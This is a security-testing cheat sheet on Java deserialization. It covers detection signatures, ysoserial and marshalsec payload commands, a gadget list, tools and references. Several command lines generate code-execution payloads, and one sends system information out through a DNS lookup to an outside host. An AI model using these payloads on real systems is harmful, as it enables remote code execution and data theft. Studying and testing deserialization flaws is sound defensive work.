# Java Deserialization

## Detection

- `"AC ED 00 05"` in Hex
  * `AC ED`: STREAM_MAGIC. Specifies that this is a serialization protocol.
  * `00 05`: STREAM_VERSION. The serialization version.
- `"rO0"` in Base64
- Content-type = "application/x-java-serialized-object"
- `"H4sIAAAAAAAAAJ"` in gzip(base64)

## Tools

### Ysoserial

[frohoff/ysoserial](https://github.com/frohoff/ysoserial) : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

```java
java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
```

**List of payloads included in ysoserial:**
```ps1
Payload             Authors                                Dependencies                                                                                                                                                                                        
-------             -------                                ------------                                                                                                                                                                                        
AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      
BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5                                                                                                                                                                                           
C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                           
Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                         
Clojure             @JackOfMostTrades                      clojure:1.8.0                                                                                                                                                                                       
CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               
CommonsCollections1 @frohoff                               commons-collections:3.1                                                                                                                                                                             
CommonsCollections2 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
CommonsCollections3 @frohoff                               commons-collections:3.1                                                                                                                                                                             
CommonsCollections4 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1                                                                                                                                                                             
CommonsCollections6 @matthias_kaiser                       commons-collections:3.1                                                                                                                                                                             
CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                                                                                                                             
FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
Groovy1             @frohoff                               groovy:2.3.9                                                                                                                                                                                        
Hibernate1          @mbechler                                                                                                                                                                                                                                  
Hibernate2          @mbechler                                                                                                                                                                                                                                  
JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                            
JRMPClient          @mbechler                                                                                                                                                                                                                                  
JRMPListener        @mbechler                                                                                                                                                                                                                                  
JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                        
Jdk7u21             @frohoff                                                                                                                                                                                                                                   
Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2                                                                                                                                                                             
MozillaRhino1       @matthias_kaiser                       js:1.7R2                                                                                                                                                                                            
MozillaRhino2       @_tint0                                js:1.7R2                                                                                                                                                                                            
Myfaces1            @mbechler                                                                                                                                                                                                                                  
Myfaces2            @mbechler                                                                                                                                                                                                                                  
ROME                @mbechler                              rome:1.0                                                                                                                                                                                            
Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                               
Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                           
URLDNS              @gebl                                                                                                                                                                                                                                      
Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                          
Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4   
```

### Burp extensions using ysoserial

- [JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller)
- [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)
- [Burp-ysoserial](https://github.com/summitt/burp-ysoserial)
- [SuperSerial](https://github.com/DirectDefense/SuperSerial)
- [SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active)

### Alternative Tooling

- [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget)
- [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool
- [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified)
- [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java serialization brute force attack tool
- [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - A tool to dump Java serialization streams in a more human readable form
- [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe)
- [k3idii/Deserek](https://github.com/k3idii/Deserek)
  ```java
  java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
  python deserek.py yss_base.bin --format python > yss_url.py
  python yss_url.py yss_new.bin
  java -cp JavaSerializationTestSuite DeSerial yss_new.bin
  ```
- [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Turning your data into code execution
  ```java
  $ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
  $ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
  $ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
  // -a - generates/tests all payloads for that marshaller
  // -t - runs in test mode, unmarshalling the generated payloads after generating them.
  // -v - verbose mode, e.g. also shows the generated payload in test mode.
  // gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.
  // arguments - Gadget specific arguments
  ```

Payload generators for the following marshallers are included:<br />

| Marshaller                      | Gadget Impact
| ------------------------------- | ----------------------------------------------
| BlazeDSAMF(0&#124;3&#124;X)     | JDK only escalation to Java serialization<br/>various third party libraries RCEs
| Hessian&#124;Burlap             | various third party RCEs
| Castor                          | dependency library RCE
| Jackson                         | **possible JDK only RCE**, various third party RCEs
| Java                            | yet another third party RCE
| JsonIO                          | **JDK only RCE**
| JYAML                           | **JDK only RCE**
| Kryo                            | third party RCEs
| KryoAltStrategy                 | **JDK only RCE**
| Red5AMF(0&#124;3)               | **JDK only RCE**
| SnakeYAML                       | **JDK only RCEs**
| XStream                         | **JDK only RCEs**
| YAMLBeans                       | third party RCE

## Gadgets

Require:
* `java.io.Serializable`




## References

- [Github - ysoserial](https://github.com/frohoff/ysoserial)
- [Triggering a DNS lookup using Java Deserialization - paranoidsoftware.com](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
- [Detecting deserialization bugs with DNS exfiltration - Philippe Arteau | Mar 22, 2017](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
- [Java-Deserialization-Cheat-Sheet - GrrrDog](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)
- [Understanding & practicing java deserialization exploits](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)
- [How i found a 1500$ worth Deserialization vulnerability - @D0rkerDevil](https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
- [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - 14 Aug 2017, Peter Stöckli](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
- [Jackson CVE-2019-12384: anatomy of a vulnerability class](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
- [On Jackson CVEs: Don’t Panic — Here is what you need to know](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96)
- [Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin / @artsploit - 29 June 2021](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
